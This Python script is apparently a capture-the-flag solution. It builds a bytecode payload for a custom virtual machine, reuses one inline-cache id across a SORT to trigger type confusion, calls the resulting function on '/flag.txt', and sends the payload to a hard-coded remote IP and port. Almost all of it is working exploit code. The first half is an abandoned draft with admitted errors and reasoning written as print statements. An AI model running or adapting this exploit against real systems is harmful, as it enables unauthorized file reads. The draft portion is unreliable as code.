import socket
import struct
import time

def p8(x): return struct.pack('<B', x)
def p16(x): return struct.pack('<H', x)
def p16_signed(x): return struct.pack('<h', x)

# Constants
consts = [
    b"caps",                    # 0
    b"/flag.txt",               # 1
]

payload = b""
# Header: [nr_regs] [cs_count]
payload += p8(0x10)  # 16 registers
payload += p8(len(consts))

# Constants Definitions
for c in consts:
    payload += p8(0x02)      # Type: String
    payload += p16(len(c))   # Length
    payload += c             # Bytes

# Bytecode with loop to reuse PC
code = b""
pc = 0

# 1. LOADG r0, global["caps"]
code += p8(0x02) + p8(0x00) + p8(0x00)
pc += 3

# 2. GETPROP r1, r0.c -> r1 = F7
code += p8(0x20) + p8(0x01) + p8(0x00) + p8(0x03)
pc += 4

# 3. r10 = 0 (counter: 0 = first, 1 = after SORT)
code += p8(0x01) + p8(0x0A) + p8(0x00)  # LOADK r10, consts[0] - wait, we need an int!
# Actually, let's use r10 = r0 initially, then change it
pc += 3

# Let me redesign: use a flag in a register
# r10 = 0 first time, then we set it to non-zero

# Better approach: use JMPT (jump if true)
# First pass: r10 is undefined/0 -> doesn't jump -> caches
# After cache, set r10 = some value
# SORT
# Jump back to GETPROPC
# Second pass: uses cache!

print("Redesigning with jump...")
print("Actually, let me think simpler...")
print()
print("The PC value in GETPROPC opcode is a parameter!")
print("GETPROPC format: [0x21] [result_reg] [pc_id] [obj_reg] [key]")
print()
print("The pc_id is used as a KEY to store/lookup cache!")
print("So we can use the SAME pc_id in both GETPROPC calls!")
print()
print("Let's just use pc_id = 1 for both:")

code = b""

# 1. LOADG r0, global["caps"]
code += p8(0x02) + p8(0x00) + p8(0x00)

# 2. GETPROP r1, r0.c
code += p8(0x20) + p8(0x01) + p8(0x00) + p8(0x03)

# 3. GETPROPC r2, PC_ID=1, r1, key=10
code += p8(0x21) + p8(0x02) + p8(0x01) + p8(0x01) + p8(0x0a)

# 4. SORT r1, key=10
code += p8(0x70) + p8(0x01) + p8(0x0a)

# 5. GETPROPC r3, PC_ID=1 (SAME!), r1, key=10
code += p8(0x21) + p8(0x03) + p8(0x01) + p8(0x01) + p8(0x0a)

# 6. LOADK r4, "/flag.txt"
code += p8(0x01) + p8(0x04) + p8(0x01)

# 7. CALL r5, r3(r4)
code += p8(0x30) + p8(0x05) + p8(0x03) + p8(0x01) + p8(0x01) + p8(0x04)

# 8. RET r5
code += p8(0x31) + p8(0x05)

payload += code

hex_payload = payload.hex()
print(f"Fixed payload: {hex_payload}")
print(f"Length: {len(payload)} bytes")

# Test it
HOST = '35.245.96.82'
PORT = 5000

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print(f"\n[+] Connected to {HOST}:{PORT}")
    
    s.sendall(hex_payload.encode() + b'\n')
    time.sleep(0.5)
    
    response = s.recv(4096).decode()
    print(f"[+] Response: {response}")
    
    s.close()
except Exception as e:
    print(f"[-] Error: {e}")
